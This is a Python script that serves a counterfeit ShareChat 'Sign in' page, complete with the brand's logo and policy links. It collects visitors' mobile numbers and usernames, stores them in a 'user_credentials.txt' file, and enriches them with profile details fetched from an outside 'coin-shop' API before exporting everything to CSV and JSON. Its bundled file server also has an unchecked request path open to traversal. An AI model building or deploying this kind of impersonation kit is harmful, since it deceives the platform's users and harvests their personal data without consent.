import requests
import json
import time
import sys
import os
import logging
import threading
import webbrowser
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import csv

class ShareChatLiveFetcher:
    def __init__(self):
        """
        Live ShareChat Profile Fetcher Tool
        आपके original index.html को serve करता है
        """
        # API endpoint
        self.api_url = "https://sharechat-coin-shop.vercel.app/api/profile-data"
        
        # Data files
        self.base_dir = os.path.dirname(os.path.abspath(__file__))
        self.web_dir = os.path.join(self.base_dir, "web")
        self.data_dir = os.path.join(self.base_dir, "data")
        self.exports_dir = os.path.join(self.base_dir, "exports")
        
        # Create directories
        os.makedirs(self.web_dir, exist_ok=True)
        os.makedirs(self.data_dir, exist_ok=True)
        os.makedirs(self.exports_dir, exist_ok=True)
        
        # Files
        self.credentials_file = os.path.join(self.data_dir, "user_credentials.txt")
        self.results_file = os.path.join(self.data_dir, "results.json")
        self.log_file = os.path.join(self.data_dir, "sharechat.log")
        
        # Server settings - Render के लिए port environment variable से लें
        self.server_port = int(os.environ.get("PORT", 8080))
        self.server_host = "0.0.0.0"  # Render के लिए यह ज़रूरी है
        self.server = None
        self.server_thread = None
        self.is_running = False
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(self.log_file),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
        # Session setup
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://sharechat-coin-shop.vercel.app',
            'Referer': 'https://sharechat-coin-shop.vercel.app/index.html'
        })
        
        # Store current results
        self.current_results = []
        
        # Check if index.html exists, if not create from your original HTML
        self.index_path = os.path.join(self.web_dir, "index.html")
        if not os.path.exists(self.index_path):
            self.create_your_index_html()
    
    def create_your_index_html(self):
        """
        आपका original index.html create करें
        """
        html_content = '''<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in</title>

  <link href="https://fonts.googleapis.com/css?family=Inter:400,600,700&display=swap" rel="stylesheet">
  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📱</text></svg>">

  <style>
    * {
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      margin: 0;
      padding: 0;
      background: #fff;
      font-family: 'Inter', Arial, sans-serif;
      color: #212936;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      overflow-x: hidden;
    }

    .container {
      max-width: 100%;
      width: 100%;
      margin: 0 auto;
      padding: 20px 24px 40px;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      min-height: -webkit-fill-available;
    }

    .logo {
      margin: 40px auto 28px;
      width: 80px;
      height: 80px;
      border-radius: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.07);
      background: white;
    }

    .logo-img {
      width: 74px;
      height: 74px;
      object-fit: contain;
      border-radius: 16px;
    }

    h1 {
      font-size: 1.75rem;
      font-weight: 700;
      margin-bottom: 8px;
      text-align: center;
      line-height: 1.3;
    }

    .subtitle {
      font-size: 0.95rem;
      margin-bottom: 28px;
      color: #6c757d;
      text-align: center;
      line-height: 1.4;
      padding: 0 10px;
    }

    .input-group {
      display: flex;
      width: 100%;
      margin-bottom: 18px;
      border: 1.5px solid #e0e2e6;
      border-radius: 10px;
      background: #fff;
      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.05);
      align-items: center;
      transition: all 0.2s ease;
    }

    .input-group:focus-within {
      border-color: #212936;
      box-shadow: 0 0 0 3px rgba(33, 41, 54, 0.1);
    }

    .input-group select,
    .input-group input {
      border: none;
      font-size: 1rem;
      padding: 14px 12px;
      outline: none;
      background: transparent;
      height: 52px;
      font-family: 'Inter', Arial, sans-serif;
      width: 100%;
      -webkit-appearance: none;
      appearance: none;
      color: #212936;
    }

    .input-group select {
      width: 85px;
      min-width: 85px;
      border-right: 1px solid #e0e2e6;
      font-weight: 600;
      text-align-last: center;
      padding-right: 8px;
      background: transparent;
      cursor: pointer;
    }

    .input-group input {
      flex: 1;
      min-width: 0;
    }

    input::placeholder {
      color: #9ca3af;
      opacity: 1;
    }

    .btn {
      width: 100%;
      font-size: 1.05rem;
      font-weight: 700;
      border-radius: 10px;
      padding: 16px 0;
      margin: 20px 0 10px;
      cursor: pointer;
      background: #212936;
      color: #fff;
      border: none;
      transition: all 0.2s ease;
      touch-action: manipulation;
      position: relative;
      overflow: hidden;
    }

    .btn:active,
    .btn:focus-visible {
      background: #3a4558;
      transform: translateY(1px);
      outline: none;
    }

    .btn:focus-visible {
      box-shadow: 0 0 0 3px rgba(33, 41, 54, 0.3);
    }

    .terms {
      font-size: 0.85rem;
      text-align: center;
      margin-bottom: 20px;
      line-height: 1.5;
      padding: 0 5px;
      color: #6b7280;
    }

    .terms a {
      color: #212936;
      font-weight: 700;
      text-decoration: underline;
      transition: color 0.2s ease;
    }

    .terms a:active {
      color: #3a4558;
    }

    .download-text {
      margin-top: 36px;
      font-size: 1rem;
      text-align: center;
      margin-bottom: 18px;
      font-weight: 600;
      color: #212936;
    }

    .app-badges {
      display: flex;
      justify-content: center;
      gap: 14px;
      flex-wrap: wrap;
    }

    .app-badges img {
      height: 42px;
      cursor: pointer;
      max-width: 100%;
      transition: transform 0.2s ease;
    }

    .app-badges img:active {
      transform: scale(0.98);
    }

    /* Loading state */
    .btn.loading {
      opacity: 0.8;
      pointer-events: none;
    }

    .btn.loading::after {
      content: '';
      position: absolute;
      width: 20px;
      height: 20px;
      top: 50%;
      left: 50%;
      margin: -10px 0 0 -10px;
      border: 2px solid rgba(255, 255, 255, 0.3);
      border-top-color: white;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    /* Mobile optimizations */
    @media (max-width: 360px) {
      .container {
        padding: max(16px, env(safe-area-inset-top)) max(20px, env(safe-area-inset-right)) max(36px, env(safe-area-inset-bottom)) max(20px, env(safe-area-inset-left));
      }
      
      .logo {
        width: 72px;
        height: 72px;
        margin: 30px auto 24px;
      }
      
      .logo-img {
        width: 66px;
        height: 66px;
      }
      
      h1 {
        font-size: 1.6rem;
      }
      
      .subtitle {
        font-size: 0.9rem;
        margin-bottom: 24px;
      }
      
      .input-group select,
      .input-group input {
        height: 48px;
        padding: 12px 10px;
        font-size: 0.95rem;
      }
      
      .input-group select {
        width: 80px;
        min-width: 80px;
      }
      
      .btn {
        padding: 15px 0;
        font-size: 1rem;
      }
      
      .app-badges img {
        height: 38px;
      }
    }

    @media (min-width: 768px) {
      .container {
        max-width: 400px;
        padding: 32px 24px 48px;
        margin: 0 auto;
        justify-content: center;
      }
    }

    /* Safe area support for notch phones */
    @supports (padding: max(0px)) {
      .container {
        padding-left: max(24px, env(safe-area-inset-left));
        padding-right: max(24px, env(safe-area-inset-right));
        padding-bottom: max(40px, env(safe-area-inset-bottom));
      }
    }

    /* High contrast mode support */
    @media (prefers-contrast: high) {
      .input-group {
        border-width: 2px;
      }
      
      .btn {
        border: 2px solid #212936;
      }
    }

    /* Reduce motion */
    @media (prefers-reduced-motion: reduce) {
      * {
        animation-duration: 0.01ms !important;
        animation-iteration-count: 1 !important;
        transition-duration: 0.01ms !important;
      }
    }
  </style>
</head>

<body>
  <div class="container">

    <span class="logo">
      <img class="logo-img" src="https://cdn.iconscout.com/icon/free/png-256/free-sharechat-1136710.png" alt="ShareChat Logo" loading="lazy">
    </span>

    <h1>Sign in</h1>
    <div class="subtitle">मोबाइल नंबर और यूज़रनेम डालें</div>

    <form id="login-form" novalidate>

      <!-- Phone number -->
      <div class="input-group">
        <select aria-label="Country code">
          <option value="+91">+91</option>
        </select>
        <input 
          type="tel" 
          id="mobile" 
          placeholder="मोबाइल नंबर" 
          maxlength="10" 
          required 
          inputmode="numeric"
          pattern="[0-9]{10}"
          aria-label="मोबाइल नंबर"
          autocomplete="tel"
        >
      </div>

      <!-- Username -->
      <div class="input-group">
        <input 
          type="text" 
          id="username" 
          placeholder="यूज़रनेम" 
          required
          aria-label="यूज़रनेम"
          autocomplete="username"
        >
      </div>

      <div class="terms">
        By accepting this you agree to our
        <a href="#" aria-label="Terms and Conditions">Terms</a>,
        <a href="#" aria-label="Privacy Policy">Privacy</a>,
        <a href="#" aria-label="Content Policy">Content Policy</a>
      </div>

      <button type="submit" class="btn" id="submit-btn" aria-label="Submit form">
        Submit
      </button>
    </form>

    <!-- App Download Section -->
    <div class="download-text">शेयरचेट ऐप डाउनलोड करें</div>
    <div class="app-badges">
      <a href="https://play.google.com/store" aria-label="Download from Google Play Store">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play Store" loading="lazy">
      </a>
      <a href="https://apps.apple.com" aria-label="Download from App Store">
        <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store" loading="lazy">
      </a>
    </div>

  </div>

  <!-- Modified JavaScript to work with our backend -->
  <script>
    const loginForm = document.getElementById('login-form');
    const submitBtn = document.getElementById('submit-btn');
    const mobileInput = document.getElementById('mobile');
    const usernameInput = document.getElementById('username');

    // Mobile number validation
    mobileInput.addEventListener('input', function(e) {
      this.value = this.value.replace(/\\D/g, '').slice(0, 10);
    });

    // Form submission
    loginForm.addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const mobile = mobileInput.value.trim();
      const username = usernameInput.value.trim();

      // Validation
      if (!/^\\d{10}$/.test(mobile)) {
        alert("कृपया सही मोबाइल नंबर डालें (10 digits)");
        mobileInput.focus();
        return;
      }

      if (!username) {
        alert("कृपया यूज़रनेम डालें");
        usernameInput.focus();
        return;
      }

      // Show loading state
      submitBtn.classList.add('loading');
      submitBtn.disabled = true;

      try {
        // Store in localStorage
        localStorage.setItem("userMobile", mobile);
        localStorage.setItem("userUsername", username);
        localStorage.setItem("loginTime", new Date().toISOString());

        // Send data to our backend for profile fetching
        const response = await fetch('/fetch-profile', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            phone: mobile,
            username: username
          })
        });

        const result = await response.json();

        if (result.status === 'success') {
          // Show success message
          alert("✅ Profile fetched successfully!\\n\\nCheck the console for details.");
          
          // You can also redirect to a results page if you want
          // window.location.href = "/results.html";
        } else {
          alert("❌ Error: " + result.message);
        }

        // Add small delay for better UX
        await new Promise(resolve => setTimeout(resolve, 500));
        
      } catch (error) {
        console.error("Error:", error);
        alert("एरर आया है। कृपया दोबारा कोशिश करें।");
      } finally {
        submitBtn.classList.remove('loading');
        submitBtn.disabled = false;
        
        // Clear form
        loginForm.reset();
      }
    });

    // Handle Enter key navigation
    mobileInput.addEventListener('keydown', function(e) {
      if (e.key === 'Enter') {
        e.preventDefault();
        usernameInput.focus();
      }
    });

    usernameInput.addEventListener('keydown', function(e) {
      if (e.key === 'Enter') {
        e.preventDefault();
        submitBtn.click();
      }
    });

    // Check if we have saved data
    window.addEventListener('load', function() {
      // Test localStorage availability
      try {
        localStorage.setItem('test', 'test');
        localStorage.removeItem('test');
      } catch (e) {
        console.warn("LocalStorage not available:", e);
      }

      // Load saved data if exists
      const savedMobile = localStorage.getItem("userMobile");
      const savedUsername = localStorage.getItem("userUsername");
      
      if (savedMobile) {
        mobileInput.value = savedMobile;
      }
      if (savedUsername) {
        usernameInput.value = savedUsername;
      }
    });
  </script>
</body>
</html>'''
        
        with open(self.index_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        self.logger.info(f"✅ Created your original index.html at {self.index_path}")
    
    def start_server(self):
        """
        HTTP server start करें
        """
        # Create custom request handler
        class RequestHandler(BaseHTTPRequestHandler):
            parent = None  # Will be set from outside
            
            def do_GET(self):
                # Serve files from web directory
                file_path = self.path
                if file_path == '/' or file_path == '/index.html':
                    file_path = '/index.html'
                    content_type = 'text/html'
                elif file_path.endswith('.css'):
                    content_type = 'text/css'
                elif file_path.endswith('.js'):
                    content_type = 'application/javascript'
                elif file_path.endswith('.png'):
                    content_type = 'image/png'
                elif file_path.endswith('.jpg') or file_path.endswith('.jpeg'):
                    content_type = 'image/jpeg'
                elif file_path.endswith('.svg'):
                    content_type = 'image/svg+xml'
                else:
                    content_type = 'text/plain'
                
                # Remove leading slash
                if file_path.startswith('/'):
                    file_path = file_path[1:]
                
                # Default to index.html if file not specified
                if not file_path:
                    file_path = 'index.html'
                
                # Build full path
                full_path = os.path.join(self.parent.web_dir, file_path)
                
                # Check if file exists
                if os.path.exists(full_path) and os.path.isfile(full_path):
                    try:
                        with open(full_path, 'rb') as f:
                            content = f.read()
                        
                        self.send_response(200)
                        self.send_header('Content-type', content_type)
                        self.send_header('Access-Control-Allow-Origin', '*')
                        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
                        self.send_header('Pragma', 'no-cache')
                        self.send_header('Expires', '0')
                        self.end_headers()
                        self.wfile.write(content)
                        
                    except Exception as e:
                        self.send_error(500, f"Server error: {str(e)}")
                else:
                    # If file not found, serve index.html
                    if file_path != 'index.html':
                        self.send_response(302)
                        self.send_header('Location', '/')
                        self.end_headers()
                    else:
                        self.send_error(404, f"File not found: {file_path}")
            
            def do_POST(self):
                # Handle POST requests for API
                if self.path == '/fetch-profile':
                    try:
                        content_length = int(self.headers['Content-Length'])
                        post_data = self.rfile.read(content_length)
                        
                        data = json.loads(post_data.decode('utf-8'))
                        phone = data.get('phone', '')
                        username = data.get('username', '')
                        
                        print(f"\n📱 Form Submission Received:")
                        print(f"   Phone: {phone}")
                        print(f"   Username: {username}")
                        
                        # Fetch profile using parent class
                        result = self.parent.fetch_profile_api(username, phone)
                        
                        if result.get('status') == 'SUCCESS':
                            response = {
                                'status': 'success',
                                'message': 'Profile fetched successfully',
                                'profile': result.get('data', {})
                            }
                        else:
                            response = {
                                'status': 'error',
                                'message': result.get('error', 'Unknown error')
                            }
                        
                        self.send_response(200)
                        self.send_header('Content-type', 'application/json')
                        self.send_header('Access-Control-Allow-Origin', '*')
                        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
                        self.send_header('Pragma', 'no-cache')
                        self.send_header('Expires', '0')
                        self.end_headers()
                        
                        self.wfile.write(json.dumps(response).encode('utf-8'))
                        
                    except Exception as e:
                        self.send_response(500)
                        self.send_header('Content-type', 'application/json')
                        self.send_header('Access-Control-Allow-Origin', '*')
                        self.end_headers()
                        
                        response = {
                            'status': 'error',
                            'message': str(e)
                        }
                        self.wfile.write(json.dumps(response).encode('utf-8'))
                    
                    return
                
                # Default response for other POST requests
                self.send_response(404)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'error': 'Not found'}).encode('utf-8'))
            
            def do_OPTIONS(self):
                # Handle CORS preflight requests
                self.send_response(200)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
                self.send_header('Access-Control-Allow-Headers', 'Content-Type')
                self.end_headers()
            
            def log_message(self, format, *args):
                # Disable default logging to keep console clean
                # Instead use parent logger
                if self.parent:
                    self.parent.logger.info(f"{self.address_string()} - {format % args}")
                else:
                    print(f"{self.address_string()} - {format % args}")
        
        try:
            # Create server - Render के लिए 0.0.0.0 use करें
            self.server = HTTPServer((self.server_host, self.server_port), RequestHandler)
            self.is_running = True
            
            # Store parent reference in handler class
            RequestHandler.parent = self
            
            def run_server():
                # Get actual URL for Render
                actual_url = os.environ.get("RENDER_EXTERNAL_URL", f"http://localhost:{self.server_port}")
                
                self.logger.info(f"🚀 Server started on {self.server_host}:{self.server_port}")
                self.logger.info(f"🌐 Access URL: {actual_url}")
                
                print(f"\n{'='*60}")
                print("🚀 SHARECHAT LIVE PROFILE FETCHER")
                print("="*60)
                print(f"Server running at: {actual_url}")
                print(f"Host: {self.server_host}")
                print(f"Port: {self.server_port}")
                print(f"Web directory: {self.web_dir}")
                print(f"Data directory: {self.data_dir}")
                print("="*60)
                print("📱 Open the above URL in your browser")
                print("🔄 Server is ready to accept requests")
                print("="*60 + "\n")
                
                # Server loop - इसे forever run करना है
                try:
                    while self.is_running:
                        self.server.handle_request()
                except Exception as e:
                    if self.is_running:  # Only log if we're supposed to be running
                        self.logger.error(f"Server error: {e}")
                finally:
                    self.logger.info("Server loop ended")
            
            # Start server in separate thread
            self.server_thread = threading.Thread(target=run_server, daemon=True)
            self.server_thread.start()
            
            # Give server time to start
            time.sleep(2)
            
            # Log that server is ready
            self.logger.info("✅ Server initialization complete")
            print("✅ Server initialization complete")
            
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to start server: {e}")
            print(f"❌ Server startup failed: {e}")
            return False
    
    def stop_server(self):
        """
        HTTP server stop करें
        """
        if self.server:
            self.is_running = False
            try:
                # Create a dummy request to wake up the server
                import socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                try:
                    sock.connect((self.server_host, self.server_port))
                    sock.send(b'GET / HTTP/1.0\r\n\r\n')
                except:
                    pass
                finally:
                    sock.close()
                
                self.server.shutdown()
                self.server.server_close()
                self.logger.info("Server stopped")
            except Exception as e:
                self.logger.error(f"Error stopping server: {e}")
    
    def fetch_profile_api(self, username, phone=None):
        """
        API से प्रोफाइल डेटा fetch करें
        """
        start_time = time.time()
        
        try:
            payload = {'username': username}
            
            self.logger.info(f"🔍 Fetching profile: {username}")
            print(f"\n🔍 Fetching profile for: {username}")
            
            response = self.session.post(
                self.api_url,
                json=payload,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                
                if 'error' in data:
                    error_msg = f"API error: {data['error']}"
                    self.logger.error(error_msg)
                    print(f"❌ {error_msg}")
                    
                    return {
                        'error': data['error'],
                        'username': username,
                        'phone': phone,
                        'status': 'FAILED'
                    }
                
                # Add metadata
                data['fetch_time'] = round(time.time() - start_time, 2)
                data['timestamp'] = datetime.now().isoformat()
                if phone:
                    data['phone'] = phone
                
                # Save to results
                result = {
                    'data': data,
                    'phone': phone,
                    'username': username,
                    'status': 'SUCCESS',
                    'timestamp': datetime.now().isoformat()
                }
                
                self.current_results.append(result)
                
                # Display in console
                self.display_profile_console(result)
                
                # Save to file
                self.save_credentials(phone, username)
                self.save_result(result)
                
                return result
                
            else:
                error_msg = f"HTTP error: {response.status_code}"
                self.logger.error(error_msg)
                print(f"❌ {error_msg}")
                
                return {
                    'error': error_msg,
                    'username': username,
                    'phone': phone,
                    'status': 'FAILED'
                }
                
        except Exception as e:
            error_msg = f"Request error: {str(e)}"
            self.logger.error(error_msg)
            print(f"❌ {error_msg}")
            
            return {
                'error': str(e),
                'username': username,
                'phone': phone,
                'status': 'FAILED'
            }
    
    def display_profile_console(self, result):
        """
        Profile को console में display करें
        """
        if result.get('status') == 'SUCCESS':
            data = result.get('data', {})
            
            print("\n" + "=" * 60)
            print("✅ SHARECHAT PROFILE FETCHED SUCCESSFULLY")
            print("=" * 60)
            
            if result.get('phone'):
                print(f"📱 Phone: {result['phone']}")
            print(f"👤 Username: {result['username']}")
            print(f"🏷️ Name: {data.get('name', 'N/A')}")
            print(f"👥 Followers: {data.get('followers', 'N/A')}")
            print(f"🤝 Following: {data.get('following', 'N/A')}")
            print(f"📝 Posts: {data.get('posts', 'N/A')}")
            
            if data.get('gender'):
                print(f"⚧️ Gender: {data.get('gender')}")
            if data.get('language'):
                print(f"🌐 Language: {data.get('language')}")
            if data.get('region'):
                print(f"📍 Region: {data.get('region')}")
            
            print(f"⏱️ Fetch time: {data.get('fetch_time', 'N/A')}s")
            print("=" * 60 + "\n")
            
            return True
        else:
            print(f"\n❌ FAILED: {result['username']}")
            print(f"   Error: {result.get('error', 'Unknown error')}")
            if result.get('phone'):
                print(f"   Phone: {result['phone']}")
            return False
    
    def save_credentials(self, phone, username):
        """
        Credentials save करें
        """
        if not phone or not username:
            return
        
        try:
            with open(self.credentials_file, 'a', encoding='utf-8') as f:
                f.write(f"{phone},{username},{datetime.now().isoformat()}\n")
            
            self.logger.info(f"✅ Saved credentials: {phone}, {username}")
            
        except Exception as e:
            self.logger.error(f"Error saving credentials: {e}")
    
    def save_result(self, result):
        """
        Result save करें
        """
        try:
            # Load existing results
            results = []
            if os.path.exists(self.results_file):
                with open(self.results_file, 'r', encoding='utf-8') as f:
                    try:
                        results = json.load(f)
                    except:
                        results = []
            
            # Add new result
            results.append(result)
            
            # Save back
            with open(self.results_file, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            
            self.logger.info(f"✅ Result saved for: {result['username']}")
            
        except Exception as e:
            self.logger.error(f"Error saving result: {e}")
    
    def export_results(self, format='both'):
        """
        Results export करें
        """
        if not self.current_results:
            print("❌ No results to export!")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        if format in ['json', 'both']:
            json_file = os.path.join(self.exports_dir, f"profiles_{timestamp}.json")
            
            export_data = []
            for result in self.current_results:
                if result.get('status') == 'SUCCESS':
                    export_data.append(result.get('data', {}))
            
            with open(json_file, 'w', encoding='utf-8') as f:
                json.dump(export_data, f, indent=2, ensure_ascii=False)
            
            print(f"✅ JSON exported: {json_file}")
        
        if format in ['csv', 'both']:
            csv_file = os.path.join(self.exports_dir, f"profiles_{timestamp}.csv")
            
            with open(csv_file, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow([
                    'Phone', 'Username', 'Name', 'Followers', 
                    'Following', 'Posts', 'Gender', 'Language',
                    'Region', 'Status', 'Fetch Time', 'Timestamp'
                ])
                
                for result in self.current_results:
                    if result.get('status') == 'SUCCESS':
                        data = result.get('data', {})
                        writer.writerow([
                            result.get('phone', ''),
                            result['username'],
                            data.get('name', ''),
                            data.get('followers', ''),
                            data.get('following', ''),
                            data.get('posts', ''),
                            data.get('gender', ''),
                            data.get('language', ''),
                            data.get('region', ''),
                            'SUCCESS',
                            data.get('fetch_time', ''),
                            data.get('timestamp', '')
                        ])
            
            print(f"✅ CSV exported: {csv_file}")

def main():
    """
    Main function for Render deployment
    """
    print("\n" + "="*70)
    print("🚀 SHARECHAT LIVE PROFILE FETCHER - RENDER DEPLOYMENT")
    print("="*70)
    
    # Check if running on Render
    is_render = os.environ.get("RENDER") is not None
    port = os.environ.get("PORT", "8080")
    
    if is_render:
        print("✅ Running on Render Cloud Platform")
        print(f"📦 PORT: {port}")
        print(f"🌐 External URL: {os.environ.get('RENDER_EXTERNAL_URL', 'Not set')}")
    else:
        print("✅ Running locally")
        print(f"📦 PORT: {port}")
    
    # Check requirements
    try:
        import requests
        print("✅ Dependencies: requests installed")
    except ImportError:
        print("❌ Please install requests: pip install requests")
        return
    
    print("="*70)
    
    # Create fetcher
    fetcher = ShareChatLiveFetcher()
    
    # Start server
    if fetcher.start_server():
        print("\n✅ Server started successfully!")
        print("📱 Open your browser to access the web interface")
        
        try:
            # On Render, keep the main thread alive
            # On local, optionally run interactive mode
            if not is_render:
                # Local: ask if user wants interactive mode
                choice = input("\nRun in interactive mode? (y/n): ").strip().lower()
                if choice == 'y':
                    # Simple interactive loop
                    while True:
                        print("\n" + "="*50)
                        print("📊 Options:")
                        print("1. View fetched profiles")
                        print("2. Export results")
                        print("3. Clear current results")
                        print("4. Exit")
                        print("="*50)
                        
                        opt = input("\nSelect option (1-4): ").strip()
                        
                        if opt == "1":
                            if fetcher.current_results:
                                print(f"\n📊 Total profiles: {len(fetcher.current_results)}")
                                success = sum(1 for r in fetcher.current_results if r.get('status') == 'SUCCESS')
                                print(f"✅ Successful: {success}")
                                print(f"❌ Failed: {len(fetcher.current_results) - success}")
                            else:
                                print("\nℹ️ No profiles fetched yet!")
                        
                        elif opt == "2":
                            if fetcher.current_results:
                                fetcher.export_results('both')
                            else:
                                print("❌ No results to export!")
                        
                        elif opt == "3":
                            confirm = input("\nClear all results? (yes/no): ").strip().lower()
                            if confirm == 'yes':
                                fetcher.current_results = []
                                print("✅ Results cleared!")
                        
                        elif opt == "4":
                            print("\n🛑 Stopping server...")
                            break
                        
                        else:
                            print("❌ Invalid option!")
            else:
                # On Render, just keep running
                print("\n🔄 Server running... Press Ctrl+C to stop")
                print("📝 Logs are being written to data/sharechat.log")
                
                # Keep the main thread alive
                try:
                    while True:
                        time.sleep(1)
                except KeyboardInterrupt:
                    print("\n🛑 Interrupted by user")
        
        except KeyboardInterrupt:
            print("\n🛑 Interrupted by user")
        
        finally:
            fetcher.stop_server()
            print("✅ Server stopped")
            
            # Final export prompt
            if fetcher.current_results and not is_render:
                export = input("\nExport results before exiting? (y/n): ").strip().lower()
                if export == 'y':
                    fetcher.export_results('both')
    else:
        print("❌ Failed to start server!")

if __name__ == "__main__":
    # Direct execution without file checks
    main()